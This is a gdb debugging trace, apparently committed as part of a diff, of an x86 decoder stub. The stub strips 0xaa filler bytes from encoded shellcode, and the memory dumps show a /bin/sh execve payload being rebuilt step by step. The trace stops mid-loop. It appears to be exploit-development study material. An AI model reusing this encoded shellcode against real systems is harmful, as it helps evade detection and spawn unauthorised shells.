+   0x0804a084 <+68>:    mov    DWORD PTR [edx-0x55ac551e],ebp
+   0x0804a08a <+74>:    mov    DWORD PTR [edx-0x554f551f],ebp
+   0x0804a090 <+80>:    or     ebp,DWORD PTR [edx-0x557f5533]
+   0x0804a096 <+86>:    mov    ebx,0xbb
+End of assembler dump.
+0x804a064 <code+36>:    0x31    0xc0    0x50    0xaa    0x50    0xaa    0x68    0xaa
+0x804a06c <code+44>:    0x2f    0xaa    0x2f    0xaa    0x73    0xaa    0x68    0xaa
+0x804a074 <code+52>:    0x68    0xaa    0x2f    0xaa
+0x0804a05d in code ()
+(gdb)
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a05f <code+31>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     lea    edi,[esi+0x1]
+   0x0804a046 <+6>:     xor    eax,eax
+   0x0804a048 <+8>:     mov    al,0x1
+   0x0804a04a <+10>:    xor    ebx,ebx
+=> 0x0804a04c <+12>:    mov    bl,BYTE PTR [esi+eax*1]
+   0x0804a04f <+15>:    xor    bl,0xaa
+   0x0804a052 <+18>:    jne    0x804a064 <code+36>
+   0x0804a054 <+20>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
+   0x0804a058 <+24>:    mov    BYTE PTR [edi],bl
+   0x0804a05a <+26>:    inc    edi
+   0x0804a05b <+27>:    add    al,0x2
+   0x0804a05d <+29>:    jmp    0x804a04c <code+12>
+   0x0804a05f <+31>:    call   0x804a042 <code+2>
+   0x0804a064 <+36>:    xor    eax,eax
+   0x0804a066 <+38>:    push   eax
+   0x0804a067 <+39>:    stos   BYTE PTR es:[edi],al
+   0x0804a068 <+40>:    push   eax
+   0x0804a069 <+41>:    stos   BYTE PTR es:[edi],al
+   0x0804a06a <+42>:    push   0x2faa2faa
+   0x0804a06f <+47>:    stos   BYTE PTR es:[edi],al
+   0x0804a070 <+48>:    jae    0x804a01c
+   0x0804a072 <+50>:    push   0x2faa68aa
+   0x0804a077 <+55>:    stos   BYTE PTR es:[edi],al
+   0x0804a078 <+56>:    bound  ebp,QWORD PTR [edx-0x55915597]
+   0x0804a07e <+62>:    mov    DWORD PTR [edx-0x55af551d],ebp
+   0x0804a084 <+68>:    mov    DWORD PTR [edx-0x55ac551e],ebp
+   0x0804a08a <+74>:    mov    DWORD PTR [edx-0x554f551f],ebp
+   0x0804a090 <+80>:    or     ebp,DWORD PTR [edx-0x557f5533]
+   0x0804a096 <+86>:    mov    ebx,0xbb
+End of assembler dump.
+0x804a064 <code+36>:    0x31    0xc0    0x50    0xaa    0x50    0xaa    0x68    0xaa
+0x804a06c <code+44>:    0x2f    0xaa    0x2f    0xaa    0x73    0xaa    0x68    0xaa
+0x804a074 <code+52>:    0x68    0xaa    0x2f    0xaa
+0x0804a04c in code ()
+(gdb)
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a05f <code+31>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     lea    edi,[esi+0x1]
+   0x0804a046 <+6>:     xor    eax,eax
+   0x0804a048 <+8>:     mov    al,0x1
+   0x0804a04a <+10>:    xor    ebx,ebx
+   0x0804a04c <+12>:    mov    bl,BYTE PTR [esi+eax*1]
+=> 0x0804a04f <+15>:    xor    bl,0xaa
+   0x0804a052 <+18>:    jne    0x804a064 <code+36>
+   0x0804a054 <+20>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
+   0x0804a058 <+24>:    mov    BYTE PTR [edi],bl
+   0x0804a05a <+26>:    inc    edi
+   0x0804a05b <+27>:    add    al,0x2
+   0x0804a05d <+29>:    jmp    0x804a04c <code+12>
+   0x0804a05f <+31>:    call   0x804a042 <code+2>
+   0x0804a064 <+36>:    xor    eax,eax
+   0x0804a066 <+38>:    push   eax
+   0x0804a067 <+39>:    stos   BYTE PTR es:[edi],al
+   0x0804a068 <+40>:    push   eax
+   0x0804a069 <+41>:    stos   BYTE PTR es:[edi],al
+   0x0804a06a <+42>:    push   0x2faa2faa
+   0x0804a06f <+47>:    stos   BYTE PTR es:[edi],al
+   0x0804a070 <+48>:    jae    0x804a01c
+   0x0804a072 <+50>:    push   0x2faa68aa
+   0x0804a077 <+55>:    stos   BYTE PTR es:[edi],al
+   0x0804a078 <+56>:    bound  ebp,QWORD PTR [edx-0x55915597]
+   0x0804a07e <+62>:    mov    DWORD PTR [edx-0x55af551d],ebp
+   0x0804a084 <+68>:    mov    DWORD PTR [edx-0x55ac551e],ebp
+   0x0804a08a <+74>:    mov    DWORD PTR [edx-0x554f551f],ebp
+   0x0804a090 <+80>:    or     ebp,DWORD PTR [edx-0x557f5533]
+   0x0804a096 <+86>:    mov    ebx,0xbb
+End of assembler dump.
+0x804a064 <code+36>:    0x31    0xc0    0x50    0xaa    0x50    0xaa    0x68    0xaa
+0x804a06c <code+44>:    0x2f    0xaa    0x2f    0xaa    0x73    0xaa    0x68    0xaa
+0x804a074 <code+52>:    0x68    0xaa    0x2f    0xaa
+0x0804a04f in code ()
+(gdb)
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a05f <code+31>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     lea    edi,[esi+0x1]
+   0x0804a046 <+6>:     xor    eax,eax
+   0x0804a048 <+8>:     mov    al,0x1
+   0x0804a04a <+10>:    xor    ebx,ebx
+   0x0804a04c <+12>:    mov    bl,BYTE PTR [esi+eax*1]
+   0x0804a04f <+15>:    xor    bl,0xaa
+=> 0x0804a052 <+18>:    jne    0x804a064 <code+36>
+   0x0804a054 <+20>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
+   0x0804a058 <+24>:    mov    BYTE PTR [edi],bl
+   0x0804a05a <+26>:    inc    edi
+   0x0804a05b <+27>:    add    al,0x2
+   0x0804a05d <+29>:    jmp    0x804a04c <code+12>
+   0x0804a05f <+31>:    call   0x804a042 <code+2>
+   0x0804a064 <+36>:    xor    eax,eax
+   0x0804a066 <+38>:    push   eax
+   0x0804a067 <+39>:    stos   BYTE PTR es:[edi],al
+   0x0804a068 <+40>:    push   eax
+   0x0804a069 <+41>:    stos   BYTE PTR es:[edi],al
+   0x0804a06a <+42>:    push   0x2faa2faa
+   0x0804a06f <+47>:    stos   BYTE PTR es:[edi],al
+   0x0804a070 <+48>:    jae    0x804a01c
+   0x0804a072 <+50>:    push   0x2faa68aa
+   0x0804a077 <+55>:    stos   BYTE PTR es:[edi],al
+   0x0804a078 <+56>:    bound  ebp,QWORD PTR [edx-0x55915597]
+   0x0804a07e <+62>:    mov    DWORD PTR [edx-0x55af551d],ebp
+   0x0804a084 <+68>:    mov    DWORD PTR [edx-0x55ac551e],ebp
+   0x0804a08a <+74>:    mov    DWORD PTR [edx-0x554f551f],ebp
+   0x0804a090 <+80>:    or     ebp,DWORD PTR [edx-0x557f5533]
+   0x0804a096 <+86>:    mov    ebx,0xbb
+End of assembler dump.
+0x804a064 <code+36>:    0x31    0xc0    0x50    0xaa    0x50    0xaa    0x68    0xaa
+0x804a06c <code+44>:    0x2f    0xaa    0x2f    0xaa    0x73    0xaa    0x68    0xaa
+0x804a074 <code+52>:    0x68    0xaa    0x2f    0xaa
+0x0804a052 in code ()
+(gdb)
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a05f <code+31>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     lea    edi,[esi+0x1]
+   0x0804a046 <+6>:     xor    eax,eax
+   0x0804a048 <+8>:     mov    al,0x1
+   0x0804a04a <+10>:    xor    ebx,ebx
+   0x0804a04c <+12>:    mov    bl,BYTE PTR [esi+eax*1]
+   0x0804a04f <+15>:    xor    bl,0xaa
+   0x0804a052 <+18>:    jne    0x804a064 <code+36>
+=> 0x0804a054 <+20>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
+   0x0804a058 <+24>:    mov    BYTE PTR [edi],bl
+   0x0804a05a <+26>:    inc    edi
+   0x0804a05b <+27>:    add    al,0x2
+   0x0804a05d <+29>:    jmp    0x804a04c <code+12>
+   0x0804a05f <+31>:    call   0x804a042 <code+2>
+   0x0804a064 <+36>:    xor    eax,eax
+   0x0804a066 <+38>:    push   eax
+   0x0804a067 <+39>:    stos   BYTE PTR es:[edi],al
+   0x0804a068 <+40>:    push   eax
+   0x0804a069 <+41>:    stos   BYTE PTR es:[edi],al
+   0x0804a06a <+42>:    push   0x2faa2faa
+   0x0804a06f <+47>:    stos   BYTE PTR es:[edi],al
+   0x0804a070 <+48>:    jae    0x804a01c
+   0x0804a072 <+50>:    push   0x2faa68aa
+   0x0804a077 <+55>:    stos   BYTE PTR es:[edi],al
+   0x0804a078 <+56>:    bound  ebp,QWORD PTR [edx-0x55915597]
+   0x0804a07e <+62>:    mov    DWORD PTR [edx-0x55af551d],ebp
+   0x0804a084 <+68>:    mov    DWORD PTR [edx-0x55ac551e],ebp
+   0x0804a08a <+74>:    mov    DWORD PTR [edx-0x554f551f],ebp
+   0x0804a090 <+80>:    or     ebp,DWORD PTR [edx-0x557f5533]
+   0x0804a096 <+86>:    mov    ebx,0xbb
+End of assembler dump.
+0x804a064 <code+36>:    0x31    0xc0    0x50    0xaa    0x50    0xaa    0x68    0xaa
+0x804a06c <code+44>:    0x2f    0xaa    0x2f    0xaa    0x73    0xaa    0x68    0xaa
+0x804a074 <code+52>:    0x68    0xaa    0x2f    0xaa
+0x0804a054 in code ()
+(gdb)
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a05f <code+31>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     lea    edi,[esi+0x1]
+   0x0804a046 <+6>:     xor    eax,eax
+   0x0804a048 <+8>:     mov    al,0x1
+   0x0804a04a <+10>:    xor    ebx,ebx
+   0x0804a04c <+12>:    mov    bl,BYTE PTR [esi+eax*1]
+   0x0804a04f <+15>:    xor    bl,0xaa
+   0x0804a052 <+18>:    jne    0x804a064 <code+36>
+   0x0804a054 <+20>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
+=> 0x0804a058 <+24>:    mov    BYTE PTR [edi],bl
+   0x0804a05a <+26>:    inc    edi
+   0x0804a05b <+27>:    add    al,0x2
+   0x0804a05d <+29>:    jmp    0x804a04c <code+12>
+   0x0804a05f <+31>:    call   0x804a042 <code+2>
+   0x0804a064 <+36>:    xor    eax,eax
+   0x0804a066 <+38>:    push   eax
+   0x0804a067 <+39>:    stos   BYTE PTR es:[edi],al
+   0x0804a068 <+40>:    push   eax
+   0x0804a069 <+41>:    stos   BYTE PTR es:[edi],al
+   0x0804a06a <+42>:    push   0x2faa2faa
+   0x0804a06f <+47>:    stos   BYTE PTR es:[edi],al
+   0x0804a070 <+48>:    jae    0x804a01c
+   0x0804a072 <+50>:    push   0x2faa68aa
+   0x0804a077 <+55>:    stos   BYTE PTR es:[edi],al
+   0x0804a078 <+56>:    bound  ebp,QWORD PTR [edx-0x55915597]
+   0x0804a07e <+62>:    mov    DWORD PTR [edx-0x55af551d],ebp
+   0x0804a084 <+68>:    mov    DWORD PTR [edx-0x55ac551e],ebp
+   0x0804a08a <+74>:    mov    DWORD PTR [edx-0x554f551f],ebp
+   0x0804a090 <+80>:    or     ebp,DWORD PTR [edx-0x557f5533]
+   0x0804a096 <+86>:    mov    ebx,0xbb
+End of assembler dump.
+0x804a064 <code+36>:    0x31    0xc0    0x50    0xaa    0x50    0xaa    0x68    0xaa
+0x804a06c <code+44>:    0x2f    0xaa    0x2f    0xaa    0x73    0xaa    0x68    0xaa
+0x804a074 <code+52>:    0x68    0xaa    0x2f    0xaa
+0x0804a058 in code ()
+(gdb)
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a05f <code+31>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     lea    edi,[esi+0x1]
+   0x0804a046 <+6>:     xor    eax,eax
+   0x0804a048 <+8>:     mov    al,0x1
+   0x0804a04a <+10>:    xor    ebx,ebx
+   0x0804a04c <+12>:    mov    bl,BYTE PTR [esi+eax*1]
+   0x0804a04f <+15>:    xor    bl,0xaa
+   0x0804a052 <+18>:    jne    0x804a064 <code+36>
+   0x0804a054 <+20>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
+   0x0804a058 <+24>:    mov    BYTE PTR [edi],bl
+=> 0x0804a05a <+26>:    inc    edi
+   0x0804a05b <+27>:    add    al,0x2
+   0x0804a05d <+29>:    jmp    0x804a04c <code+12>
+   0x0804a05f <+31>:    call   0x804a042 <code+2>
+   0x0804a064 <+36>:    xor    eax,eax
+   0x0804a066 <+38>:    push   eax
+   0x0804a067 <+39>:    push   0xaa68aa50
+   0x0804a06c <+44>:    das
+   0x0804a06d <+45>:    stos   BYTE PTR es:[edi],al
+   0x0804a06e <+46>:    das
+   0x0804a06f <+47>:    stos   BYTE PTR es:[edi],al
+   0x0804a070 <+48>:    jae    0x804a01c
+   0x0804a072 <+50>:    push   0x2faa68aa
+   0x0804a077 <+55>:    stos   BYTE PTR es:[edi],al
+   0x0804a078 <+56>:    bound  ebp,QWORD PTR [edx-0x55915597]
+   0x0804a07e <+62>:    mov    DWORD PTR [edx-0x55af551d],ebp
+   0x0804a084 <+68>:    mov    DWORD PTR [edx-0x55ac551e],ebp
+   0x0804a08a <+74>:    mov    DWORD PTR [edx-0x554f551f],ebp
+   0x0804a090 <+80>:    or     ebp,DWORD PTR [edx-0x557f5533]
+   0x0804a096 <+86>:    mov    ebx,0xbb
+End of assembler dump.
+0x804a064 <code+36>:    0x31    0xc0    0x50    0x68    0x50    0xaa    0x68    0xaa
+0x804a06c <code+44>:    0x2f    0xaa    0x2f    0xaa    0x73    0xaa    0x68    0xaa
+0x804a074 <code+52>:    0x68    0xaa    0x2f    0xaa
+0x0804a05a in code ()
+(gdb) break *0x0804a05a
+Breakpoint 3 at 0x804a05a
+(gdb) c
+Continuing.
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a05f <code+31>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     lea    edi,[esi+0x1]
+   0x0804a046 <+6>:     xor    eax,eax
+   0x0804a048 <+8>:     mov    al,0x1
+   0x0804a04a <+10>:    xor    ebx,ebx
+   0x0804a04c <+12>:    mov    bl,BYTE PTR [esi+eax*1]
+   0x0804a04f <+15>:    xor    bl,0xaa
+   0x0804a052 <+18>:    jne    0x804a064 <code+36>
+   0x0804a054 <+20>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
+   0x0804a058 <+24>:    mov    BYTE PTR [edi],bl
+=> 0x0804a05a <+26>:    inc    edi
+   0x0804a05b <+27>:    add    al,0x2
+   0x0804a05d <+29>:    jmp    0x804a04c <code+12>
+   0x0804a05f <+31>:    call   0x804a042 <code+2>
+   0x0804a064 <+36>:    xor    eax,eax
+   0x0804a066 <+38>:    push   eax
+   0x0804a067 <+39>:    push   0xaa68aa2f
+   0x0804a06c <+44>:    das
+   0x0804a06d <+45>:    stos   BYTE PTR es:[edi],al
+   0x0804a06e <+46>:    das
+   0x0804a06f <+47>:    stos   BYTE PTR es:[edi],al
+   0x0804a070 <+48>:    jae    0x804a01c
+   0x0804a072 <+50>:    push   0x2faa68aa
+   0x0804a077 <+55>:    stos   BYTE PTR es:[edi],al
+   0x0804a078 <+56>:    bound  ebp,QWORD PTR [edx-0x55915597]
+   0x0804a07e <+62>:    mov    DWORD PTR [edx-0x55af551d],ebp
+   0x0804a084 <+68>:    mov    DWORD PTR [edx-0x55ac551e],ebp
+   0x0804a08a <+74>:    mov    DWORD PTR [edx-0x554f551f],ebp
+   0x0804a090 <+80>:    or     ebp,DWORD PTR [edx-0x557f5533]
+   0x0804a096 <+86>:    mov    ebx,0xbb
+End of assembler dump.
+0x804a064 <code+36>:    0x31    0xc0    0x50    0x68    0x2f    0xaa    0x68    0xaa
+0x804a06c <code+44>:    0x2f    0xaa    0x2f    0xaa    0x73    0xaa    0x68    0xaa
+0x804a074 <code+52>:    0x68    0xaa    0x2f    0xaa
+
+Breakpoint 3, 0x0804a05a in code ()
+(gdb) c
+Continuing.
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a05f <code+31>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     lea    edi,[esi+0x1]
+   0x0804a046 <+6>:     xor    eax,eax
+   0x0804a048 <+8>:     mov    al,0x1
+   0x0804a04a <+10>:    xor    ebx,ebx
+   0x0804a04c <+12>:    mov    bl,BYTE PTR [esi+eax*1]
+   0x0804a04f <+15>:    xor    bl,0xaa
+   0x0804a052 <+18>:    jne    0x804a064 <code+36>
+   0x0804a054 <+20>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
+   0x0804a058 <+24>:    mov    BYTE PTR [edi],bl
+=> 0x0804a05a <+26>:    inc    edi
+   0x0804a05b <+27>:    add    al,0x2
+   0x0804a05d <+29>:    jmp    0x804a04c <code+12>
+   0x0804a05f <+31>:    call   0x804a042 <code+2>
+   0x0804a064 <+36>:    xor    eax,eax
+   0x0804a066 <+38>:    push   eax
+   0x0804a067 <+39>:    push   0xaa682f2f
+   0x0804a06c <+44>:    das
+   0x0804a06d <+45>:    stos   BYTE PTR es:[edi],al
+   0x0804a06e <+46>:    das
+   0x0804a06f <+47>:    stos   BYTE PTR es:[edi],al
+   0x0804a070 <+48>:    jae    0x804a01c
+   0x0804a072 <+50>:    push   0x2faa68aa
+   0x0804a077 <+55>:    stos   BYTE PTR es:[edi],al
+   0x0804a078 <+56>:    bound  ebp,QWORD PTR [edx-0x55915597]
+   0x0804a07e <+62>:    mov    DWORD PTR [edx-0x55af551d],ebp
+   0x0804a084 <+68>:    mov    DWORD PTR [edx-0x55ac551e],ebp
+   0x0804a08a <+74>:    mov    DWORD PTR [edx-0x554f551f],ebp
+   0x0804a090 <+80>:    or     ebp,DWORD PTR [edx-0x557f5533]
+   0x0804a096 <+86>:    mov    ebx,0xbb
+End of assembler dump.
+0x804a064 <code+36>:    0x31    0xc0    0x50    0x68    0x2f    0x2f    0x68    0xaa
+0x804a06c <code+44>:    0x2f    0xaa    0x2f    0xaa    0x73    0xaa    0x68    0xaa
+0x804a074 <code+52>:    0x68    0xaa    0x2f    0xaa
+
+Breakpoint 3, 0x0804a05a in code ()
+(gdb) c
+Continuing.
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a05f <code+31>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     lea    edi,[esi+0x1]
+   0x0804a046 <+6>:     xor    eax,eax
+   0x0804a048 <+8>:     mov    al,0x1
+   0x0804a04a <+10>:    xor    ebx,ebx
+   0x0804a04c <+12>:    mov    bl,BYTE PTR [esi+eax*1]
+   0x0804a04f <+15>:    xor    bl,0xaa
+   0x0804a052 <+18>:    jne    0x804a064 <code+36>
+   0x0804a054 <+20>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
+   0x0804a058 <+24>:    mov    BYTE PTR [edi],bl
+=> 0x0804a05a <+26>:    inc    edi
+   0x0804a05b <+27>:    add    al,0x2
+   0x0804a05d <+29>:    jmp    0x804a04c <code+12>
+   0x0804a05f <+31>:    call   0x804a042 <code+2>
+   0x0804a064 <+36>:    xor    eax,eax
+   0x0804a066 <+38>:    push   eax
+   0x0804a067 <+39>:    push   0xaa732f2f
+   0x0804a06c <+44>:    das
+   0x0804a06d <+45>:    stos   BYTE PTR es:[edi],al
+   0x0804a06e <+46>:    das
+   0x0804a06f <+47>:    stos   BYTE PTR es:[edi],al
+   0x0804a070 <+48>:    jae    0x804a01c
+   0x0804a072 <+50>:    push   0x2faa68aa
+   0x0804a077 <+55>:    stos   BYTE PTR es:[edi],al
+   0x0804a078 <+56>:    bound  ebp,QWORD PTR [edx-0x55915597]
+   0x0804a07e <+62>:    mov    DWORD PTR [edx-0x55af551d],ebp
+   0x0804a084 <+68>:    mov    DWORD PTR [edx-0x55ac551e],ebp
+   0x0804a08a <+74>:    mov    DWORD PTR [edx-0x554f551f],ebp
+   0x0804a090 <+80>:    or     ebp,DWORD PTR [edx-0x557f5533]
+   0x0804a096 <+86>:    mov    ebx,0xbb
+End of assembler dump.
+0x804a064 <code+36>:    0x31    0xc0    0x50    0x68    0x2f    0x2f    0x73    0xaa
+0x804a06c <code+44>:    0x2f    0xaa    0x2f    0xaa    0x73    0xaa    0x68    0xaa
+0x804a074 <code+52>:    0x68    0xaa    0x2f    0xaa
+
+Breakpoint 3, 0x0804a05a in code ()
+(gdb) c
+Continuing.
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a05f <code+31>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     lea    edi,[esi+0x1]
+   0x0804a046 <+6>:     xor    eax,eax
+   0x0804a048 <+8>:     mov    al,0x1
+   0x0804a04a <+10>:    xor    ebx,ebx
+   0x0804a04c <+12>:    mov    bl,BYTE PTR [esi+eax*1]
+   0x0804a04f <+15>:    xor    bl,0xaa
+   0x0804a052 <+18>:    jne    0x804a064 <code+36>
+   0x0804a054 <+20>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
+   0x0804a058 <+24>:    mov    BYTE PTR [edi],bl
+=> 0x0804a05a <+26>:    inc    edi
+   0x0804a05b <+27>:    add    al,0x2
+   0x0804a05d <+29>:    jmp    0x804a04c <code+12>
+   0x0804a05f <+31>:    call   0x804a042 <code+2>
+   0x0804a064 <+36>:    xor    eax,eax
+   0x0804a066 <+38>:    push   eax
+   0x0804a067 <+39>:    push   0x68732f2f
+   0x0804a06c <+44>:    das
+   0x0804a06d <+45>:    stos   BYTE PTR es:[edi],al
+   0x0804a06e <+46>:    das
+   0x0804a06f <+47>:    stos   BYTE PTR es:[edi],al
+   0x0804a070 <+48>:    jae    0x804a01c
+   0x0804a072 <+50>:    push   0x2faa68aa
+   0x0804a077 <+55>:    stos   BYTE PTR es:[edi],al
+   0x0804a078 <+56>:    bound  ebp,QWORD PTR [edx-0x55915597]
+   0x0804a07e <+62>:    mov    DWORD PTR [edx-0x55af551d],ebp
+   0x0804a084 <+68>:    mov    DWORD PTR [edx-0x55ac551e],ebp
+   0x0804a08a <+74>:    mov    DWORD PTR [edx-0x554f551f],ebp
+   0x0804a090 <+80>:    or     ebp,DWORD PTR [edx-0x557f5533]
+   0x0804a096 <+86>:    mov    ebx,0xbb
+End of assembler dump.
+0x804a064 <code+36>:    0x31    0xc0    0x50    0x68    0x2f    0x2f    0x73    0x68
+0x804a06c <code+44>:    0x2f    0xaa    0x2f    0xaa    0x73    0xaa    0x68    0xaa
+0x804a074 <code+52>:    0x68    0xaa    0x2f    0xaa
+
+Breakpoint 3, 0x0804a05a in code ()
+(gdb) c
+Continuing.
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a05f <code+31>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     lea    edi,[esi+0x1]
+   0x0804a046 <+6>:     xor    eax,eax
+   0x0804a048 <+8>:     mov    al,0x1
+   0x0804a04a <+10>:    xor    ebx,ebx
+   0x0804a04c <+12>:    mov    bl,BYTE PTR [esi+eax*1]
+   0x0804a04f <+15>:    xor    bl,0xaa
+   0x0804a052 <+18>:    jne    0x804a064 <code+36>
+   0x0804a054 <+20>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
+   0x0804a058 <+24>:    mov    BYTE PTR [edi],bl
+=> 0x0804a05a <+26>:    inc    edi
+   0x0804a05b <+27>:    add    al,0x2
+   0x0804a05d <+29>:    jmp    0x804a04c <code+12>
+   0x0804a05f <+31>:    call   0x804a042 <code+2>
+   0x0804a064 <+36>:    xor    eax,eax
+   0x0804a066 <+38>:    push   eax
+   0x0804a067 <+39>:    push   0x68732f2f
+   0x0804a06c <+44>:    push   0x73aa2faa
+   0x0804a071 <+49>:    stos   BYTE PTR es:[edi],al
+   0x0804a072 <+50>:    push   0x2faa68aa
+   0x0804a077 <+55>:    stos   BYTE PTR es:[edi],al
+   0x0804a078 <+56>:    bound  ebp,QWORD PTR [edx-0x55915597]
+   0x0804a07e <+62>:    mov    DWORD PTR [edx-0x55af551d],ebp
+   0x0804a084 <+68>:    mov    DWORD PTR [edx-0x55ac551e],ebp
+   0x0804a08a <+74>:    mov    DWORD PTR [edx-0x554f551f],ebp
+   0x0804a090 <+80>:    or     ebp,DWORD PTR [edx-0x557f5533]
+   0x0804a096 <+86>:    mov    ebx,0xbb
+End of assembler dump.
+0x804a064 <code+36>:    0x31    0xc0    0x50    0x68    0x2f    0x2f    0x73    0x68
+0x804a06c <code+44>:    0x68    0xaa    0x2f    0xaa    0x73    0xaa    0x68    0xaa
+0x804a074 <code+52>:    0x68    0xaa    0x2f    0xaa
+
+Breakpoint 3, 0x0804a05a in code ()
+(gdb) c
+Continuing.
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a05f <code+31>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     lea    edi,[esi+0x1]
+   0x0804a046 <+6>:     xor    eax,eax
+   0x0804a048 <+8>:     mov    al,0x1
+   0x0804a04a <+10>:    xor    ebx,ebx
+   0x0804a04c <+12>:    mov    bl,BYTE PTR [esi+eax*1]
+   0x0804a04f <+15>:    xor    bl,0xaa
+   0x0804a052 <+18>:    jne    0x804a064 <code+36>
+   0x0804a054 <+20>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
+   0x0804a058 <+24>:    mov    BYTE PTR [edi],bl
+=> 0x0804a05a <+26>:    inc    edi
+   0x0804a05b <+27>:    add    al,0x2
+   0x0804a05d <+29>:    jmp    0x804a04c <code+12>
+   0x0804a05f <+31>:    call   0x804a042 <code+2>
+   0x0804a064 <+36>:    xor    eax,eax
+   0x0804a066 <+38>:    push   eax
+   0x0804a067 <+39>:    push   0x68732f2f
+   0x0804a06c <+44>:    push   0x73aa2f2f
+   0x0804a071 <+49>:    stos   BYTE PTR es:[edi],al
+   0x0804a072 <+50>:    push   0x2faa68aa
+   0x0804a077 <+55>:    stos   BYTE PTR es:[edi],al
+   0x0804a078 <+56>:    bound  ebp,QWORD PTR [edx-0x55915597]
+   0x0804a07e <+62>:    mov    DWORD PTR [edx-0x55af551d],ebp
+   0x0804a084 <+68>:    mov    DWORD PTR [edx-0x55ac551e],ebp
+   0x0804a08a <+74>:    mov    DWORD PTR [edx-0x554f551f],ebp
+   0x0804a090 <+80>:    or     ebp,DWORD PTR [edx-0x557f5533]
+   0x0804a096 <+86>:    mov    ebx,0xbb
+End of assembler dump.
+0x804a064 <code+36>:    0x31    0xc0    0x50    0x68    0x2f    0x2f    0x73    0x68
+0x804a06c <code+44>:    0x68    0x2f    0x2f    0xaa    0x73    0xaa    0x68    0xaa
+0x804a074 <code+52>:    0x68    0xaa    0x2f    0xaa
+
+Breakpoint 3, 0x0804a05a in code ()
+(gdb) c
+Continuing.
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a05f <code+31>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     lea    edi,[esi+0x1]
+   0x0804a046 <+6>:     xor    eax,eax
+   0x0804a048 <+8>:     mov    al,0x1
+   0x0804a04a <+10>:    xor    ebx,ebx
+   0x0804a04c <+12>:    mov    bl,BYTE PTR [esi+eax*1]
+   0x0804a04f <+15>:    xor    bl,0xaa
+   0x0804a052 <+18>:    jne    0x804a064 <code+36>
+   0x0804a054 <+20>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
+   0x0804a058 <+24>:    mov    BYTE PTR [edi],bl
+=> 0x0804a05a <+26>:    inc    edi
+   0x0804a05b <+27>:    add    al,0x2
+   0x0804a05d <+29>:    jmp    0x804a04c <code+12>
+   0x0804a05f <+31>:    call   0x804a042 <code+2>
+   0x0804a064 <+36>:    xor    eax,eax
+   0x0804a066 <+38>:    push   eax
+   0x0804a067 <+39>:    push   0x68732f2f
+   0x0804a06c <+44>:    push   0x73aa622f
+   0x0804a071 <+49>:    stos   BYTE PTR es:[edi],al
+   0x0804a072 <+50>:    push   0x2faa68aa
+   0x0804a077 <+55>:    stos   BYTE PTR es:[edi],al
+   0x0804a078 <+56>:    bound  ebp,QWORD PTR [edx-0x55915597]
+   0x0804a07e <+62>:    mov    DWORD PTR [edx-0x55af551d],ebp
+   0x0804a084 <+68>:    mov    DWORD PTR [edx-0x55ac551e],ebp
+   0x0804a08a <+74>:    mov    DWORD PTR [edx-0x554f551f],ebp
+   0x0804a090 <+80>:    or     ebp,DWORD PTR [edx-0x557f5533]
+   0x0804a096 <+86>:    mov    ebx,0xbb
+End of assembler dump.
+0x804a064 <code+36>:    0x31    0xc0    0x50    0x68    0x2f    0x2f    0x73    0x68
+0x804a06c <code+44>:    0x68    0x2f    0x62    0xaa    0x73    0xaa    0x68    0xaa
+0x804a074 <code+52>:    0x68    0xaa    0x2f    0xaa
+
+Breakpoint 3, 0x0804a05a in code ()
+(gdb) c
+Continuing.
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a05f <code+31>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     lea    edi,[esi+0x1]
+   0x0804a046 <+6>:     xor    eax,eax
+   0x0804a048 <+8>:     mov    al,0x1
+   0x0804a04a <+10>:    xor    ebx,ebx
+   0x0804a04c <+12>:    mov    bl,BYTE PTR [esi+eax*1]
+   0x0804a04f <+15>:    xor    bl,0xaa
+   0x0804a052 <+18>:    jne    0x804a064 <code+36>
+   0x0804a054 <+20>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
+   0x0804a058 <+24>:    mov    BYTE PTR [edi],bl
+=> 0x0804a05a <+26>:    inc    edi
+   0x0804a05b <+27>:    add    al,0x2
+   0x0804a05d <+29>:    jmp    0x804a04c <code+12>
